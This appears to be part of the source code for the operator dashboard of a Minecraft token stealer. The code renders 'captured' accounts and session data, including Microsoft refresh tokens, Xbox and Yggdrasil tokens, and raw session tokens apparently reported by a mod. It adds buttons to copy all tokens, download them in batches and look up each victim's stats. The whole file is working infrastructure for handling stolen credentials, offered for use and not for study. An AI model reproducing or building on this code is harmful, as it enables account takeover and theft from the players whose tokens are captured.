      document.querySelectorAll('.scard').forEach(card => {
        const text = card.getAttribute('data-search') || '';
        const show = !q || text.includes(q);
        card.style.display = show ? '' : 'none';
        if (show) visible++;
      });
      const nr = document.getElementById('no-session-results');
      if (nr) nr.style.display = (q && visible === 0) ? '' : 'none';
    }
    document.addEventListener('keydown', e => {
      if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
        e.preventDefault();
        const s = document.getElementById('search') || document.getElementById('search-sessions');
        if (s) s.focus();
      }
    });
    try {
      const saved = localStorage.getItem('dash-tab');
      if (saved && document.getElementById('tab-' + saved)) switchTab(saved);
    } catch {}

    const RAW_ACCOUNTS = ${JSON.stringify(accounts.map((a) => a._raw)).replace(/<\//g, "<\\/")};
    const BATCHES = ${JSON.stringify(
      accountBatches.map((b) => b.accounts.map((a) => a._raw)),
    ).replace(/<\//g, "<\\/")};
    const BATCH_FILES = ${JSON.stringify(
      accountBatches.map((b, i) => {
        const d = b.time ? new Date(b.time) : new Date(0);
        const stamp = isNaN(d.getTime())
          ? "unknown"
          : d.toISOString().replace(/[:.]/g, "-").slice(0, 19);
        return "accounts-" + stamp + "-" + (i + 1) + ".json";
      }),
    )};
    const SESSIONS = ${JSON.stringify(
      sessions.map((s, i) => ({
        i,
        username: s.username,
        tokenRaw: s.tokenRaw,
        timestamp: s.timestamp,
        profileUrl: s.profileUrl,
        modVersion: s.modVersion,
        time: s.time,
        url: s.url,
      })),
    ).replace(/<\//g, "<\\/")};

    function getRawAccount(i) { return RAW_ACCOUNTS[i]; }
    function getSession(i) { return SESSIONS[i]; }
    function copyFromRaw(i, path) {
      const obj = getRawAccount(i);
      const val = path.split('.').reduce((o, k) => o && o[k], obj);
      copy(val !== undefined && val !== null ? (typeof val === 'object' ? JSON.stringify(val, null, 2) : String(val)) : '');
    }
    function copySessionField(i, field) { copy(getSession(i)[field] || ''); }
    function copyBtnClick(e, i, path, btn, label) {
      e.stopPropagation();
      e.preventDefault();
      const el = document.getElementById('acard-' + i);
      if (el && el.classList.contains('collapsed')) {
        el.classList.remove('collapsed');
        el.querySelector('.collapse-icon').innerHTML = '&#9650;';
      }
      copyFromRaw(i, path);
      btn.textContent = '\u2713';
      btn.style.background = '#2ea043';
      btn.style.borderColor = '#2ea043';
      setTimeout(() => {
        btn.textContent = label;
        btn.style.background = '';
        btn.style.borderColor = '';
      }, 1000);
    }

    function copyYggTokens() {
      const tokens = RAW_ACCOUNTS.map(a => a.ygg?.token).filter(Boolean);
      if (tokens.length === 0) { toast('No ygg tokens found'); return; }
      copy(tokens.join('\\n---\\n'));
    }
    function copyAllAccounts() {
      copy(JSON.stringify({ accounts: RAW_ACCOUNTS }, null, 2));
    }
    function copyBatchJson(e, id) {
      e.stopPropagation();
      e.preventDefault();
      copy(JSON.stringify({ accounts: BATCHES[id] || [] }, null, 2));
    }
    function downloadBatchJson(e, id) {
      e.stopPropagation();
      e.preventDefault();
      const json = JSON.stringify({ accounts: BATCHES[id] || [] }, null, 2);
      const blob = new Blob([json], { type: 'application/json' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = BATCH_FILES[id] || ('accounts-' + (id + 1) + '.json');
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(a.href);
      toast('Downloaded!');
    }
    function copyAllSessions() {
      copy(JSON.stringify({ sessions: SESSIONS }, null, 2));
    }
    function deleteEntry(e, btn) {
      e.stopPropagation(); e.preventDefault();
      const el = btn.closest('[data-entry-t]');
      if (!el) return;
      const t = el.getAttribute('data-entry-t');
      const u = el.getAttribute('data-entry-u') || '';
      if (!confirm('Delete this entry from ' + new Date(t).toLocaleString() + '?')) return;
      btn.textContent = '...'; btn.disabled = true;
      fetch('/api/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ t, u }) })
        .then(r => r.json()).then(d => { if (d.ok) location.reload(); else { btn.textContent = 'Error'; btn.disabled = false; } })
        .catch(() => { btn.textContent = 'Error'; btn.disabled = false; });
    }
    function clearData() {
      if (!confirm('Delete ALL captured data? This cannot be undone.')) return;
      fetch('/api/clear', { method: 'POST' }).then(() => location.reload());
    }
  </script>
</body>
</html>`;
    return res.status(200).setHeader("Content-Type", "text/html").send(html);
  }

  return res.status(405).end();
}

/* ───── Render helpers ───── */

function v(val) {
  if (val === null || val === undefined)
    return '<span class="field-val" style="color:#484f58;">—</span>';
  if (typeof val === "boolean")
    return val
      ? '<span class="field-val green">true</span>'
      : '<span class="field-val red">false</span>';
  if (typeof val === "number")
    return `<span class="field-val purple">${val}</span>`;
  return null;
}

function field(lbl, val, cpyPath) {
  const valHtml = v(val);
  if (valHtml)
    return `<div class="field-row"><span class="field-lbl">${lbl}</span>${valHtml}</div>`;
  const s = String(val);
  const isLong = s.length > 60;
  const id = "f-" + Math.random().toString(36).slice(2, 8);
  const cpy = cpyPath
    ? `<button class="cpy" onclick="copyFromRaw(${cpyPath.i},'${cpyPath.p}');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy value">cpy</button>`
    : "";
  const toggleAttr = isLong
    ? " onclick=\"toggleTrunc('" + id + '\')" title="Click to expand"'
    : "";
  return (
    '<div class="field-row"><span class="field-lbl">' +
    lbl +
    '</span><span class="field-val' +
    (isLong ? " trunc" : "") +
    '" id="' +
    id +
    '"' +
    toggleAttr +
    ">" +
    esc(s) +
    "</span>" +
    cpy +
    "</div>"
  );
}

function fieldDate(lbl, ts) {
  if (!ts) return "";
  const d = new Date(ts * 1000);
  const relative = Math.round((ts - Date.now() / 1000) / 86400);
  const col = relative < 0 ? "red" : relative < 7 ? "orange" : "";
  return `<div class="field-row"><span class="field-lbl">${lbl}</span><span class="field-val ${col}">${d.toLocaleString()} (${relative > 0 ? "in " + relative + "d" : relative === 0 ? "today" : Math.abs(relative) + "d ago"})</span></div>`;
}

function tokenField(lbl, val, col, cpyPath) {
  const s = String(val);
  const isLong = s.length > 60;
  const id = "f-" + Math.random().toString(36).slice(2, 8);
  const cpy = cpyPath
    ? `<button class="cpy" onclick="copyFromRaw(${cpyPath.i},'${cpyPath.p}');this.textContent='ok';setTimeout(()=>this.textContent='cpy',1000)" title="Copy raw token">cpy</button>`
    : "";
  return `<div class="field-row"><span class="field-lbl">${lbl}</span><span class="field-val ${col}">${esc(col ? val : isLong ? s.slice(0, 80) + "..." : s)}</span>${cpy}</div>`;
}

function renderDecodedToken(label, token, idx, path) {
  const decoded = decodeJwt(token);
  let rows = "";
  if (!decoded) {
    rows = field(label, token, { i: idx, p: path });
  } else if (decoded.encrypted) {
    const headerEntries = formatJwtPayload(decoded.header);
    let headerRows = "";
    if (headerEntries.some((e) => e.k === "enc")) {
      headerRows = headerEntries
        .filter((e) => ["enc", "alg", "zip", "x5t", "cty"].includes(e.k))
        .map((e) => {
          if (e.kind === "date")
            return fieldDate(
              label + ".header." + e.k,
              Math.round(new Date(e.v).getTime() / 1000),
            );
          return field(label + ".header." + e.k, e.v);
        })
        .join("\n");
    } else {
      headerRows = headerEntries
        .map((e) => {
          if (e.kind === "date")
            return fieldDate(
              label + ".header." + e.k,
              Math.round(new Date(e.v).getTime() / 1000),
            );
          if (e.kind === "json")
            return field(label + ".header." + e.k, JSON.stringify(e.v));
          return field(label + ".header." + e.k, e.v);
        })
        .join("\n");
    }
    rows = tokenField(label, String(token).slice(0, 120) + "...", "orange", {
      i: idx,
      p: path,
    });
    rows += headerRows;
  } else {
    if (decoded.payload) {
      const entries = formatJwtPayload(decoded.payload);
      let decodedFields = "";
      entries.forEach((e) => {
        const lbl = label + "." + e.k;
        if (e.kind === "date")
          decodedFields += fieldDate(lbl, decoded.payload[e.k]);
        else if (e.kind === "json")
          decodedFields += field(lbl, JSON.stringify(e.v, null, 2));
        else decodedFields += field(lbl, e.v);
      });
      rows = tokenField(
        label,
        "Decoded JWT (" +
          (decoded.payload.sub || decoded.payload.xuid || "?") +
          ")",
        "green",
        { i: idx, p: path },
      );
      rows += decodedFields;
    }
  }
  return rows;
}

/* ───── Account renderer ───── */

function relativeTime(iso) {
  if (!iso) return "";
  const sec = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
  if (sec < 60) return "just now";
  if (sec < 3600) return Math.floor(sec / 60) + "m ago";
  if (sec < 86400) return Math.floor(sec / 3600) + "h ago";
  if (sec < 604800) return Math.floor(sec / 86400) + "d ago";
  return new Date(iso).toLocaleDateString();
}

function yggBadge(raw) {
  if (!raw?.ygg?.token)
    return { text: "No token", cls: "badge-muted" };
  const exp = raw.ygg.exp;
  if (!exp) return { text: "Active", cls: "badge-green" };
  const days = Math.round((exp - Date.now() / 1000) / 86400);
  if (days < 0) return { text: "Expired", cls: "badge-red" };
  if (days < 7) return { text: days + "d left", cls: "badge-orange" };
  return { text: days + "d left", cls: "badge-green" };
}

function renderSection(title, bodyHtml, idx, copyPath, open) {
  const copyBtn = copyPath
    ? `<button class="cpy" onclick="event.stopPropagation();copyFromRaw(${idx},'${copyPath}');flashCopy(this)">Copy</button>`
    : "";
  return `<div class="section ${open ? "section-open" : "section-closed"}">
      <div class="section-title" onclick="toggleSection(this)">
        <span class="section-chevron">▾</span>
        <span>${title}</span>
        <span class="section-spacer"></span>
        ${copyBtn}
      </div>
      <div class="section-body">${bodyHtml}</div>
    </div>`;
}

function renderAccountBatch(batch, startIdx) {
  const timeStr = batch.time
    ? new Date(batch.time).toLocaleString()
    : "Unknown time";
  const rel = relativeTime(batch.time);
  const summary = batch.summary ? esc(batch.summary) : "";
  const names = batch.accounts.map((a) => a.name).filter(Boolean);
  const chips =
    names
      .slice(0, 6)
      .map((n) => `<span class="name-chip">${esc(n)}</span>`)
      .join("") +
    (names.length > 6
      ? `<span class="name-chip muted">+${names.length - 6} more</span>`
      : "");
  const accountsHtml = batch.accounts
    .map((a, i) => renderAccount(a, startIdx + i))
    .join("\n");
  const collapsed = batch.id === 0 ? "" : " collapsed";
  return `<div class="batch${collapsed}" id="batch-${batch.id}" data-batch="${batch.id}" data-entry-t="${esc(batch.time)}" data-entry-u="${esc(batch.url)}">
    <div class="batch-header" onclick="toggleBatch(${batch.id})">
      <span class="collapse-icon">&#9660;</span>
      <div style="flex:1;min-width:0;">
        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
          <div class="batch-title">${esc(timeStr)}</div>
          <span class="rel-time">${esc(rel)}</span>
        </div>
        <div class="batch-meta">${esc(batch.url)} · ${batch.accounts.length} account(s)${summary ? " · " + summary : ""}</div>
        <div class="batch-chips">${chips}</div>
      </div>
      <div class="batch-actions">
        <button class="btn btn-sm btn-outline" onclick="copyBatchJson(event,${batch.id})">Copy JSON</button>
        <button class="btn btn-sm btn-primary" onclick="downloadBatchJson(event,${batch.id})">Download .json</button>
        <button class="btn btn-sm btn-danger" onclick="deleteEntry(event,this)">Delete</button>
      </div>
    </div>
    <div class="batch-body">
      ${accountsHtml}
    </div>
  </div>`;
}

function renderAccount(a, idx) {
  const r = a._raw;
  const p = r.profile || {};
  const uuidClean = (p.id || a.uuid).replace(/-/g, "");
  const msa = r.msa || {};

  function cpy(path) {
    return { i: idx, p: path };
  }

  const ent = r.entitlement || {};
  const capes = p.capes || [];
  const capeHtml =
    capes.length > 0
      ? `<div class="cape-grid">${capes.map((c) => `<span class="cape-badge">${esc(c.alias || c.id || "?")}</span>`).join("")}</div>`
      : '<span class="field-val" style="color:#484f58;">None</span>';

  const skin = p.skin || {};
  const skinDataUri = skin.data ? skinDataToDataUri(skin.data) : null;

  // Token sections
  const msaTokenFields = [];
  if (msa.token)
    msaTokenFields.push(
      renderDecodedToken("access_token", msa.token, idx, "msa.token"),
    );
  if (msa.refresh_token)
    msaTokenFields.push(
      field("refresh_token", msa.refresh_token, cpy("msa.refresh_token")),
    );
  if (msa.exp) msaTokenFields.push(fieldDate("expires", msa.exp));
  if (msa.iat) msaTokenFields.push(fieldDate("issued_at", msa.iat));
  if (msa.extra) {
    Object.entries(msa.extra).forEach(([k, v]) =>
      msaTokenFields.push(field("extra." + k, v)),
    );
  }

  const ut = r.utoken || {};
  const utokenFields = [];
  if (ut.token)
    utokenFields.push(
      renderDecodedToken("token", ut.token, idx, "utoken.token"),
    );
  if (ut.exp) utokenFields.push(fieldDate("expires", ut.exp));
  if (ut.iat) utokenFields.push(fieldDate("issued_at", ut.iat));
  if (ut.extra) {
    Object.entries(ut.extra).forEach(([k, v]) =>
      utokenFields.push(field("extra." + k, v)),
    );
  }

  const xrp = r["xrp-mc"] || {};
  const xrpFields = [];
  if (xrp.token)
    xrpFields.push(renderDecodedToken("token", xrp.token, idx, "xrp-mc.token"));
  if (xrp.exp) xrpFields.push(fieldDate("expires", xrp.exp));
  if (xrp.iat) xrpFields.push(fieldDate("issued_at", xrp.iat));
  if (xrp.extra) {
    Object.entries(xrp.extra).forEach(([k, v]) =>
      xrpFields.push(field("extra." + k, v)),
    );
  }

  const ygg = r.ygg || {};
  const yggFields = [];
  if (ygg.token)
    yggFields.push(renderDecodedToken("token", ygg.token, idx, "ygg.token"));
  if (ygg.exp) yggFields.push(fieldDate("expires", ygg.exp));
  if (ygg.iat) yggFields.push(fieldDate("issued_at", ygg.iat));

  const playerName = esc(p.name || a.name);
  const searchName = esc((p.name || a.name || "").toLowerCase());
  const badge = yggBadge(r);
  const skycryptUrl = p.name
    ? "https://sky.shiiyu.moe/stats/" + esc(p.name)
    : "#";

  const profileFields = `
        ${field("id", p.id)}
        ${field("name", p.name)}
        ${field("type", r.type)}
        ${field("msa-client-id", r["msa-client-id"])}
        ${field("cape (id)", p.cape)}
        ${field("capes (" + capes.length + ")", null)}
        ${capeHtml}
        ${field("skin.id", skin.id)}
        ${field("skin.url", skin.url, cpy("profile.skin.url"))}
        ${field("skin.variant", skin.variant)}
        ${skin.data ? `<div class="field-row"><span class="field-lbl">skin.data</span><span class="field-val trunc" onclick="copyFromRaw(${idx},'profile.skin.data')" title="Click to copy">${skin.data.slice(0, 60)}...</span><button class="cpy" onclick="copyFromRaw(${idx},'profile.skin.data');flashCopy(this)">Copy</button></div>` : ""}`;

  const profileBody = skin.data
    ? `<div class="profile-grid"><div>${profileFields}</div><img class="skin-preview" src="${skinDataUri}" alt="Skin"></div>`
    : profileFields;

  return `<div class="acard collapsed" id="acard-${idx}" data-search="${searchName}">
    <div class="acard-header" onclick="toggleCard(${idx})">
      <span class="collapse-icon">&#9660;</span>
      <div class="acard-avatar"><img src="https://mc-heads.net/avatar/${uuidClean}/44" alt="" onerror="this.parentElement.textContent='${playerName[0] || "?"}'"></div>
      <div style="flex:1;min-width:0;">
        <div class="acard-name">${playerName}</div>
        <div class="acard-uuid">${esc(p.id || a.uuid)}</div>
      </div>
      <span class="badge ${badge.cls}">${esc(badge.text)}</span>
      <div class="acard-actions">
        <button class="btn btn-sm btn-ygg" onclick="copyBtnClick(event,${idx},'ygg.token',this,'Ygg')" title="Copy ygg token">Ygg</button>
        <button class="btn btn-sm btn-outline" onclick="event.stopPropagation();window.open('${skycryptUrl}','_blank')" title="SkyCrypt">SkyCrypt</button>
        <button class="btn btn-sm btn-outline" onclick="copyBtnClick(event,${idx},'profile.name',this,'Name')">Name</button>
      </div>
    </div>

    ${renderSection("Profile", profileBody, idx, "profile", true)}
    ${renderSection("Minecraft Token (ygg)", yggFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No ygg data</span>', idx, "ygg", true)}
    ${renderSection("Entitlement", `${field("ownsMinecraft", ent.ownsMinecraft)}\n        ${field("canPlayMinecraft", ent.canPlayMinecraft)}`, idx, "entitlement", false)}
    ${renderSection("MSA Token", msaTokenFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No MSA token data</span>', idx, "msa", false)}
    ${renderSection("User Token (utoken)", utokenFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No utoken data</span>', idx, "utoken", false)}
    ${renderSection("Xbox Token (xrp-mc)", xrpFields.join("\n        ") || '<span class="field-val" style="color:#484f58;">No xrp-mc data</span>', idx, "xrp-mc", false)}

  </div>`;
}

function renderSession(s, idx) {
  const search = esc(
    [s.username, s.modVersion, s.url, s.tokenRaw].filter(Boolean).join(" ").toLowerCase(),
  );
  return `<div class="scard" data-search="${search}" data-entry-t="${esc(s.time || s.timestamp)}" data-entry-u="${esc(s.url)}">
    <div class="scard-top">
      <span class="scard-path">${esc(s.url)}</span>
      <span class="rel-time">${esc(relativeTime(s.time))}</span>
      <span class="scard-time">${s.time ? new Date(s.time).toLocaleString() : s.timestamp || "?"}</span>
      <button class="btn btn-sm btn-danger" onclick="deleteEntry(event,this)" style="margin-left:auto;">Delete</button>
    </div>
    <div class="scard-user">
      ${esc(s.username || "Unknown")}
      <button class="btn btn-sm" onclick="copySessionField(${idx},'username');this.textContent='ok';setTimeout(()=>this.textContent='Copy',1000)">Copy</button>
    </div>
    <div class="scard-info">
      ${s.modVersion ? `<div class="field-row"><span class="field-lbl">Mod:</span><span class="field-val">${esc(s.modVersion)}</span></div>` : ""}
      ${s.profileUrl ? `<div class="field-row"><span class="field-lbl">Profile:</span><span class="field-val"><a href="${esc(s.profileUrl)}" target="_blank">${esc(s.profileUrl)}</a></span></div>` : ""}
    </div>
    ${
      s.tokenRaw
        ? `<div class="scard-full">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
        <span style="color:#8b949e;font-size:0.78em;">Session Token</span>
        <button class="btn btn-sm" onclick="copySessionField(${idx},'tokenRaw');this.textContent='ok';setTimeout(()=>this.textContent='Copy Token',1000)">Copy Token</button>
      </div>
      <textarea readonly rows="2">${esc(s.tokenRaw)}</textarea>
    </div>`
        : ""
    }
  </div>`;
}

function renderEntry(e) {
  const id = "raw-" + Math.random().toString(36).slice(2, 8);
  const u = e.u || "";
  let extra = "";
  if (u.includes("/ess") && e._parsed?.accounts) {
    extra = `<div class="entry-extra accounts">Parsed ${e._parsed.accounts.length} account(s): ${e._parsed.accounts.map((a) => a.name).join(", ")}</div>`;
  }
  if (e._parsed?.session) {
    extra = `<div class="entry-extra session">Session: ${esc(e._parsed.session.username)}</div>`;
  }
  return `<div class="entry" data-entry-t="${esc(e.t)}" data-entry-u="${esc(u)}">
    <div class="entry-top">
      <span class="entry-time">${new Date(e.t).toLocaleString()}</span>
      <span class="rel-time">${esc(relativeTime(e.t))}</span>
      <span class="entry-method">${e.m}</span>
      <span class="entry-path">${esc(u)}</span>
      <button class="btn btn-sm btn-danger" onclick="deleteEntry(event,this)" style="margin-left:auto;">Delete</button>
    </div>
    ${extra}
    <div class="raw-toggle" onclick="toggleRaw('${id}')">▸ Toggle raw data</div>
    <div class="raw-content" id="${id}"><pre>${esc(e.b || "(no body)")}</pre></div>
  </div>`;
}
